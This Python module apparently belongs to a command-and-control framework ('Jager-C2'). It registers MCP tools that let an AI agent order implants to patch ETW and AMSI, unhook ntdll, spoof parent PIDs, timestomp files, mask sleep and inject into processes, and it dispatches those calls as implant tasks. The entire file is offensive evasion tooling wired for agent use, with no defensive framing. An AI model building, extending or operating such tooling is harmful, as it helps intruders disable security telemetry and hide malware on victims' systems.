"""Defense evasion tools for Jager-C2 MCP server."""

from typing import Any, Dict

TOOLS = [
    {
        "name": "evasion_patch_etw",
        "description": "Patch EtwEventWrite to suppress ETW telemetry",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"}
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "evasion_patch_amsi",
        "description": "Patch AmsiScanBuffer to bypass AMSI",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"}
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "evasion_unhook_dll",
        "description": "Unhook a DLL by reloading from disk (fresh ntdll)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "dll_name": {"type": "string", "default": "ntdll.dll"}
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "evasion_ppid_spoof",
        "description": "Spawn a process with spoofed parent PID",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "command": {"type": "string"},
                "parent_pid": {"type": "integer"}
            },
            "required": ["session_id", "command", "parent_pid"]
        }
    },
    {
        "name": "evasion_blockdlls",
        "description": "Spawn a process with BlockDLLs policy (prevents non-MS DLL loading)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "command": {"type": "string"}
            },
            "required": ["session_id", "command"]
        }
    },
    {
        "name": "evasion_timestomp",
        "description": "Modify file timestamps to match another file",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target_file": {"type": "string"},
                "reference_file": {"type": "string", "description": "Copy timestamps from this file"}
            },
            "required": ["session_id", "target_file", "reference_file"]
        }
    },
    {
        "name": "evasion_sleep_mask",
        "description": "Enable/configure encrypted sleep (Ekko technique)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "enabled": {"type": "boolean", "default": True},
                "encrypt_heap": {"type": "boolean", "default": False}
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "evasion_inject",
        "description": "Inject into a target process using specified technique",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target_pid": {"type": "integer"},
                "method": {
                    "type": "string",
                    "enum": ["module_stomp", "threadless", "map_view", "early_bird"],
                    "default": "module_stomp"
                }
            },
            "required": ["session_id", "target_pid"]
        }
    },
    {
        "name": "evasion_spawn_to",
        "description": "Set the spawn-to process for fork-and-run operations",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "x64_path": {"type": "string", "default": "C:\\Windows\\System32\\dllhost.exe"},
                "x86_path": {"type": "string", "default": "C:\\Windows\\SysWOW64\\dllhost.exe"}
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "evasion_detect_hooks",
        "description": "Scan loaded DLLs for inline hooks (EDR detection)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target_dll": {"type": "string", "default": "ntdll.dll"}
            },
            "required": ["session_id"]
        }
    },
]


async def handle(tool_name: str, args: Dict[str, Any], client) -> Dict[str, Any]:
    """Handle evasion tool calls."""
    try:
        from task_client import queue_task
        from task_types import TaskType
    except ImportError:
        from ..task_client import queue_task
        from ..task_types import TaskType

    session_id = args.get("session_id", "")

    evasion_map = {
        "evasion_patch_etw": TaskType.TASK_PATCH_ETW,
        "evasion_patch_amsi": TaskType.TASK_PATCH_AMSI,
        "evasion_unhook_dll": TaskType.TASK_UNHOOK,
        "evasion_sleep_mask": TaskType.TASK_SLEEP_MASK,
        "evasion_inject": TaskType.TASK_INJECT,
        "evasion_timestomp": TaskType.TASK_TIMESTOMP,
    }

    if tool_name in evasion_map:
        return await queue_task(client, session_id, evasion_map[tool_name], args)

    if tool_name in ("evasion_ppid_spoof", "evasion_blockdlls", "evasion_spawn_to", "evasion_detect_hooks"):
        return await queue_task(client, session_id, TaskType.TASK_EXECUTE, {"variant": tool_name, **args})

    return {"error": f"Unknown tool: {tool_name}"}
